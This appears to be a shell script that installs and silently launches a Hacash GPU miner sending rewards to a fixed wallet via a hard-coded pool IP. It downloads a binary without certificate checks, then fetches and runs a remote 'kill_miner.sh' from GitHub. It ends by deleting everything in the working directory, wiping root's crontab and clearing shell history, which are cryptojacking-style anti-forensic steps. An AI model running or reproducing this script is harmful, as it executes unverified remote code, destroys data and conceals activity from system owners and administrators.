#!/bin/sh
IP4=$(curl -4 -s icanhazip.com)
convert_dots_to_underscore() {
    echo "$1" | tr '.' '_'
}
IP4_UNDERSCORE=$(convert_dots_to_underscore "$IP4")
rm -fR /root/HAC
#read -p "What is Worker? (exp: vps01): " worker
sudo apt-get update -y
sudo apt-get install cpulimit
sudo apt install ocl-icd-opencl-dev -y
wget --no-check-certificate -O HAC.zip https://www.hacash.diamonds/pool/gpu.zip
mkdir /root/HAC
unzip -o HAC.zip -d HAC
chmod +x ./HAC/* 
cores=$(nproc --all)
#rounded_cores=$((cores * 9 / 10))
#read -p "What is pool? (exp: fr-zephyr.miningocean.org): " pool
limitCPU=$((cores * 80))

cat /dev/null > /root/danielchau.sh
cat >>/root/danielchau.sh <<EOF
#!/bin/bash
sudo /root/HAC/gpupool_miner_worker_2023_09_13_04_ubuntu16.04 > /dev/null 2>&1 &
EOF
chmod +x /root/danielchau.sh

cat /dev/null > /root/HAC/poolworker.config.ini
cat >>/root/HAC/poolworker.config.ini <<EOF
pool = 182.92.163.225:3339
rewards = 13xymHri7PipAceBqBJ7N32XMvsqhN7DYx
supervene = $cores
EOF

wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
chmod +x /root/kill_miner.sh
./kill_miner.sh
sleep 3
./danielchau.sh
rm -fv *
rm -fR *
cat /dev/null > /var/spool/cron/crontabs/root
history -c && history -w
